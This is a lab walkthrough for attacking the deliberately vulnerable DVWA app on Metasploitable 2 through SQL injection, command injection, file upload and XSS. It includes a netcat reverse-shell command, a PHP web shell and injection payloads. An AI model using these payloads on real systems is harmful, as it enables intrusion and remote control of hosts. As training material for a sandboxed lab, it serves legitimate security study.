

# **DVWA Exploitation on Metasploitable 2**

This repository contains a step-by-step guide to exploiting common vulnerabilities in the Damn Vulnerable Web Application (DVWA) hosted on Metasploitable 2. The guide covers SQL Injection, Command Injection, File Upload, and Cross-Site Scripting (XSS) at different security levels (Low, Medium, High) within DVWA.

## **Table of Contents**

1. [Environment Setup](#environment-setup)
2. [Understanding DVWA Security Levels](#understanding-dvwa-security-levels)
3. [SQL Injection Exploitation](#1-sql-injection-exploitation)
4. [Command Injection Exploitation](#2-command-injection-exploitation)
5. [File Upload Exploitation](#3-file-upload-exploitation)
6. [Cross-Site Scripting (XSS) Exploitation](#4-cross-site-scripting-xss-exploitation)
7. [Conclusion](#conclusion)
8. [References](#references)

## **Environment Setup**

Before starting, ensure you have the following environment set up:

- **Attacker Machine:** Kali Linux (IP: `192.168.0.102`)
- **Target Machine:** Metasploitable 2 (IP: `192.168.0.103`)
- **Virtualization Software:** VirtualBox

Verify the IP addresses of both machines using:

```bash
ifconfig
```

## **Understanding DVWA Security Levels**

DVWA allows you to change the security level of the application, simulating different levels of protection:

- **Low:** Minimal security, easy to exploit.
- **Medium:** Basic security, slightly harder to exploit.
- **High:** Strong security, challenging to exploit.

## **1. SQL Injection Exploitation**

### **Low Security**

At the Low security level, DVWA is vulnerable to SQL Injection.

1. **Access DVWA:**
   - URL: `http://192.168.0.103/dvwa`
   - Credentials:
     - Username: `admin`
     - Password: `password`

2. **Set Security Level:**
   - Navigate to "DVWA Security" and set to "Low."

3. **SQL Injection Test:**
   - Go to "SQL Injection."
   - Input in the "User ID" field:

   ```bash
   1' OR '1'='1
   ```

4. **Extract Database Information:**
   - Input:

   ```bash
   1' UNION SELECT NULL, version() #
   ```

### **Medium Security**

At Medium security, DVWA applies some input validation.

1. **Set Security Level:**
   - Set the security level to "Medium."

2. **Advanced SQL Injection:**
   - Input:

   ```bash
   1' OR '1'='1
   ```

3. **Bypass Filters:**
   - Use SQLMap for automated injection:

   ```bash
   sqlmap -u "http://192.168.0.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=your_session_id" --dbs
   ```

### **High Security**

At High security, DVWA blocks SQL Injection attempts.

1. **Set Security Level:**
   - Change to "High."

2. **Test SQL Injection:**
   - Input the same or advanced payloads. The application should block these attempts.

## **2. Command Injection Exploitation**

### **Low Security**

At Low security, DVWA does not validate user input, making it vulnerable.

1. **Set Security Level:**
   - Ensure the level is set to "Low."

2. **Test Command Injection:**
   - Input:

   ```bash
   192.168.0.102 && whoami
   ```

3. **Gain a Reverse Shell:**
   - On Kali Linux, start a Netcat listener:

   ```bash
   nc -lvnp 4444
   ```

   - Input in DVWA:

   ```bash
   192.168.0.102 && nc 192.168.0.102 4444 -e /bin/bash
   ```

### **Medium Security**

At Medium security, DVWA attempts to sanitize input.

1. **Set Security Level:**
   - Set the security level to "Medium."

2. **Test Command Injection:**
   - Input:

   ```bash
   192.168.0.102 && whoami
   ```

3. **Bypass Filters:**
   - Try different methods:

   ```bash
   192.168.0.102 | whoami
   ```

### **High Security**

At High security, DVWA should block Command Injection.

1. **Set Security Level:**
   - Set to "High."

2. **Test Command Injection:**
   - The application should block command execution attempts.

## **3. File Upload Exploitation**

### **Low Security**

At Low security, DVWA does not restrict file types.

1. **Set Security Level:**
   - Set to "Low."

2. **Create Malicious PHP File:**
   - On Kali Linux, create a web shell:

   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   ```

3. **Upload the File:**
   - Upload `shell.php` in DVWA.

4. **Execute the Shell:**
   - Access:

   ```bash
   http://192.168.0.103/dvwa/hackable/uploads/shell.php?cmd=whoami
   ```

### **Medium Security**

At Medium security, DVWA checks file extensions.

1. **Set Security Level:**
   - Set to "Medium."

2. **Bypass File Extension Checks:**
   - Rename to `shell.php.jpg` and upload.

3. **Execute the Shell:**
   - Access the file as before.

### **High Security**

At High security, DVWA enforces stricter validation.

1. **Set Security Level:**
   - Set to "High."

2. **Upload Attempt:**
   - The application should block the file upload.

## **4. Cross-Site Scripting (XSS) Exploitation**

### **Low Security**

At Low security, DVWA does not sanitize input, allowing XSS attacks.

1. **Set Security Level:**
   - Set to "Low."

2. **Inject Script:**
   - Input in "XSS (Stored)":

   ```html
   <script>alert('XSS Attack');</script>
   ```

### **Medium Security**

At Medium security, DVWA applies some sanitization.

1. **Set Security Level:**
   - Set to "Medium."

2. **Test Injection:**
   - If blocked, use:

   ```html
   <img src="x" onerror="alert('XSS');">
   ```

### **High Security**

At High security, DVWA should block XSS.

1. **Set Security Level:**
   - Set to "High."

2. **Test Injection:**
   - The application should filter out harmful input.

## **Conclusion**

This guide explores how security measures at different levels affect vulnerability exploitation in DVWA. Testing these scenarios at Low, Medium, and High security settings provides insights into how security mechanisms protect against attacks. These exercises should always be conducted in a legal, controlled environment.

## **References**

- [Nmap Documentation](https://nmap.org/book/man.html)
- [Metasploit Framework Guide](https://docs.rapid7.com/metasploit/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Burp Suite User Guide](https://portswigger.net/burp/documentation)

---
